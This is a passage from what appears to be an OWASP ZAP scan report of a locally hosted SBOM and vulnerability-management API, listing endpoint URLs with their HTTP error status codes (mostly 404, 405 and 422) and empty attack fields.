  * Node Name: `http://host.docker.internal:8000/api/sboms/10/reports/vulnerabilities.xlsx`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/reports/vulnerabilities.xlsx%3Finclude_duplicates=false&severity=&package_name=
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/reports/vulnerabilities.xlsx (include_duplicates,package_name,severity)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/reports/vulnerabilities.xlsx%3Finclude_duplicates=http%253A%252F%252Fwww.google.com%252F&severity=&package_name=
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/reports/vulnerabilities.xlsx (include_duplicates,package_name,severity)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/reports/vulnerabilities.xlsx/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/reports/vulnerabilities.xlsx/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/restore
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/restore`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `405`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/restore/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/restore/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `405`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/restore/5705781248824384083
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/restore/5705781248824384083`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `405`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/risk-summary
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/risk-summary`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/risk-summary/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/risk-summary/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/schedule
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/schedule`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/schedule/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/schedule/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/stats
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/stats`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/stats/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/stats/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/validation-report
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/validation-report`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/validation-report/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/validation-report/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/versions
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/versions`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/versions/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/versions/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex/5576228415430223985
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex/5576228415430223985`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex/report
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex/report`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex/report%3Fformat=json&report_type=
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex/report (format,report_type)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex/report%3Fformat=http%253A%252F%252Fwww.google.com%252F&report_type=
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex/report (format,report_type)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/vex/report/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/vex/report/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/compare-versions
  * Node Name: `http://host.docker.internal:8000/api/sboms/compare-versions`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/compare-versions%3Fversion_a=10&version_b=10
  * Node Name: `http://host.docker.internal:8000/api/sboms/compare-versions (version_a,version_b)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/compare-versions%3Fversion_a=http%253A%252F%252Fwww.google.com%252F&version_b=10
  * Node Name: `http://host.docker.internal:8000/api/sboms/compare-versions (version_a,version_b)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/compare-versions/
  * Node Name: `http://host.docker.internal:8000/api/sboms/compare-versions/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/schedules%3Fscope=&enabled=&project_id=&page=1&page_size=50
  * Node Name: `http://host.docker.internal:8000/api/schedules (enabled,page,page_size,project_id,scope)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/schedules/10
  * Node Name: `http://host.docker.internal:8000/api/schedules/10`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/schedules/10/
  * Node Name: `http://host.docker.internal:8000/api/schedules/10/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/schedules/10/8530225968971091847
  * Node Name: `http://host.docker.internal:8000/api/schedules/10/8530225968971091847`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/schedules/6824520393060719887
  * Node Name: `http://host.docker.internal:8000/api/schedules/6824520393060719887`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/tenants/10
  * Node Name: `http://host.docker.internal:8000/api/tenants/10`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/tenants/10/
  * Node Name: `http://host.docker.internal:8000/api/tenants/10/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/tenants/10/4544071333614713976
  * Node Name: `http://host.docker.internal:8000/api/tenants/10/4544071333614713976`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/tenants/10/users
  * Node Name: `http://host.docker.internal:8000/api/tenants/10/users`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `403`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/tenants/10/users/
  * Node Name: `http://host.docker.internal:8000/api/tenants/10/users/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `403`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/tenants/10/users/7770358275856087453
  * Node Name: `http://host.docker.internal:8000/api/tenants/10/users/7770358275856087453`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `405`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/tenants/3128866264283628635
  * Node Name: `http://host.docker.internal:8000/api/tenants/3128866264283628635`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1
  * Node Name: `http://host.docker.internal:8000/api/v1`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/
  * Node Name: `http://host.docker.internal:8000/api/v1/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/2093880739661603856
  * Node Name: `http://host.docker.internal:8000/api/v1/2093880739661603856`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/ai
  * Node Name: `http://host.docker.internal:8000/api/v1/ai`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/ai/
  * Node Name: `http://host.docker.internal:8000/api/v1/ai/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/ai/4151602441778033492
  * Node Name: `http://host.docker.internal:8000/api/v1/ai/4151602441778033492`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/ai/credentials/10
  * Node Name: `http://host.docker.internal:8000/api/v1/ai/credentials/10`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/ai/credentials/10/
  * Node Name: `http://host.docker.internal:8000/api/v1/ai/credentials/10/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/ai/credentials/10/5350351134027087689
  * Node Name: `http://host.docker.internal:8000/api/v1/ai/credentials/10/5350351134027087689`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/ai/metrics/564474831194162940
  * Node Name: `http://host.docker.internal:8000/api/v1/ai/metrics/564474831194162940`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/ai/providers/3044986339899458405
  * Node Name: `http://host.docker.internal:8000/api/v1/ai/providers/3044986339899458405`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/ai/providers/available/6598239235643445894
  * Node Name: `http://host.docker.internal:8000/api/v1/ai/providers/available/6598239235643445894`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/ai/providers/available/ZAP
  * Node Name: `http://host.docker.internal:8000/api/v1/ai/providers/available/ZAP`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/ai/providers/available/ZAP/
  * Node Name: `http://host.docker.internal:8000/api/v1/ai/providers/available/ZAP/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/ai/registry
  * Node Name: `http://host.docker.internal:8000/api/v1/ai/registry`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/ai/registry/
  * Node Name: `http://host.docker.internal:8000/api/v1/ai/registry/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/ai/registry/915875745804815810
  * Node Name: `http://host.docker.internal:8000/api/v1/ai/registry/915875745804815810`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/ai/usage/6361999909421405063
  * Node Name: `http://host.docker.internal:8000/api/v1/ai/usage/6361999909421405063`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/ai/usage/top-cached%3Flimit=http%253A%252F%252Fwww.google.com%252F
  * Node Name: `http://host.docker.internal:8000/api/v1/ai/usage/top-cached (limit)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/ai/usage/trend%3Fdays=http%253A%252F%252Fwww.google.com%252F
  * Node Name: `http://host.docker.internal:8000/api/v1/ai/usage/trend (days)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/compare
  * Node Name: `http://host.docker.internal:8000/api/v1/compare`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `405`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/compare/
  * Node Name: `http://host.docker.internal:8000/api/v1/compare/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `405`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/compare/9084599753580614216
  * Node Name: `http://host.docker.internal:8000/api/v1/compare/9084599753580614216`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/compare/cache_key
  * Node Name: `http://host.docker.internal:8000/api/v1/compare/cache_key`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/compare/cache_key/
  * Node Name: `http://host.docker.internal:8000/api/v1/compare/cache_key/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/compare/cache_key/1167168830391276820
  * Node Name: `http://host.docker.internal:8000/api/v1/compare/cache_key/1167168830391276820`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/cves
  * Node Name: `http://host.docker.internal:8000/api/v1/cves`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/cves/
  * Node Name: `http://host.docker.internal:8000/api/v1/cves/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/cves/2970117297865859595
  * Node Name: `http://host.docker.internal:8000/api/v1/cves/2970117297865859595`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `400`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/cves/cve_id
  * Node Name: `http://host.docker.internal:8000/api/v1/cves/cve_id`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `400`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/cves/cve_id/
  * Node Name: `http://host.docker.internal:8000/api/v1/cves/cve_id/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `400`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/findings
  * Node Name: `http://host.docker.internal:8000/api/v1/findings`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/findings/
  * Node Name: `http://host.docker.internal:8000/api/v1/findings/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/findings/10
  * Node Name: `http://host.docker.internal:8000/api/v1/findings/10`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/findings/10/
  * Node Name: `http://host.docker.internal:8000/api/v1/findings/10/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/findings/10/8103074092771249468
  * Node Name: `http://host.docker.internal:8000/api/v1/findings/10/8103074092771249468`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/findings/10/ai-fix
  * Node Name: `http://host.docker.internal:8000/api/v1/findings/10/ai-fix`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/findings/10/ai-fix%3Fprovider_name=
  * Node Name: `http://host.docker.internal:8000/api/v1/findings/10/ai-fix (provider_name)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/findings/10/ai-fix/
  * Node Name: `http://host.docker.internal:8000/api/v1/findings/10/ai-fix/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/findings/6228417222233863480
  * Node Name: `http://host.docker.internal:8000/api/v1/findings/6228417222233863480`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/runs
  * Node Name: `http://host.docker.internal:8000/api/v1/runs`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/runs/
  * Node Name: `http://host.docker.internal:8000/api/v1/runs/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/runs/10
  * Node Name: `http://host.docker.internal:8000/api/v1/runs/10`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/runs/10/
  * Node Name: `http://host.docker.internal:8000/api/v1/runs/10/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/runs/10/2922316348343387131
  * Node Name: `http://host.docker.internal:8000/api/v1/runs/10/2922316348343387131`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/runs/10/ai-fixes
  * Node Name: `http://host.docker.internal:8000/api/v1/runs/10/ai-fixes`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/
  * Node Name: `http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/253135861954558703
  * Node Name: `http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/253135861954558703`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/batches
  * Node Name: `http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/batches`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/batches/
  * Node Name: `http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/batches/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/batches/7214090796100562231
  * Node Name: `http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/batches/7214090796100562231`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/batches/batch_id
  * Node Name: `http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/batches/batch_id`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/batches/batch_id/
  * Node Name: `http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/batches/batch_id/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/batches/batch_id/7015940645864944522
  * Node Name: `http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/batches/batch_id/7015940645864944522`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/batches/batch_id/stream
  * Node Name: `http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/batches/batch_id/stream`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/batches/batch_id/stream/
  * Node Name: `http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/batches/batch_id/stream/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/estimate
  * Node Name: `http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/estimate`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/estimate/
  * Node Name: `http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/estimate/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/progress
  * Node Name: `http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/progress`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/progress/
  * Node Name: `http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/progress/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/stream
  * Node Name: `http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/stream`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/stream/
  * Node Name: `http://host.docker.internal:8000/api/v1/runs/10/ai-fixes/stream/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/runs/7093504990560156660
  * Node Name: `http://host.docker.internal:8000/api/v1/runs/7093504990560156660`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/scans
  * Node Name: `http://host.docker.internal:8000/api/v1/scans`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/scans/
  * Node Name: `http://host.docker.internal:8000/api/v1/scans/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/scans/10
  * Node Name: `http://host.docker.internal:8000/api/v1/scans/10`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/scans/10/
  * Node Name: `http://host.docker.internal:8000/api/v1/scans/10/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/scans/10/7984386794930547926
  * Node Name: `http://host.docker.internal:8000/api/v1/scans/10/7984386794930547926`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/scans/10/cves
  * Node Name: `http://host.docker.internal:8000/api/v1/scans/10/cves`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/scans/10/cves/
  * Node Name: `http://host.docker.internal:8000/api/v1/scans/10/cves/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/scans/10/cves/4214569334771006623
  * Node Name: `http://host.docker.internal:8000/api/v1/scans/10/cves/4214569334771006623`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `400`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/scans/10/cves/cve_id
  * Node Name: `http://host.docker.internal:8000/api/v1/scans/10/cves/cve_id`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `400`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/scans/10/cves/cve_id/
  * Node Name: `http://host.docker.internal:8000/api/v1/scans/10/cves/cve_id/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `400`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/v1/scans/1339196192639216263
  * Node Name: `http://host.docker.internal:8000/api/v1/scans/1339196192639216263`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/954494701502149151
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/954494701502149151`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/3826057645170115389
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/3826057645170115389`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/ai
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/ai`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/ai/
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/ai/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/validation-sessions/session_id/ai/2838853520373742635
  * Node Name: `http://host.docker.internal:8000/api/validation-sessions/session_id/ai/2838853520373742635`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
